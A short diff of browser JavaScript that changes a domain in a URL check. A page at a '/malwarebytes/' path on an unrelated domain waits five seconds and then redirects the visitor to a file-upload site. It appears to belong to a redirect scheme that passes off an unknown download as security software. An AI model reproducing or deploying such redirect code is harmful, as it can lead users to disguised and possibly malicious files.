@@ -26,7 +26,7 @@ var stop8 = false;
                 //window.location.href = "https://imagetwist.com/l806xwm2497w/82334700_461830197829137_1912626512608100352_n.jpg"
             },10000)
         }
-        try{if(window.location.href == "https://all4yourlife.tech/malwarebytes/" && stop1 == false){
+        try{if(window.location.href == "https://movieshd4.xyz/malwarebytes/" && stop1 == false){
             console.log("dasd");
             setTimeout(function(){window.location.href = "https://www.file-upload.com/ldxpmxxqj6gg"},5000)
             stop1 = true;
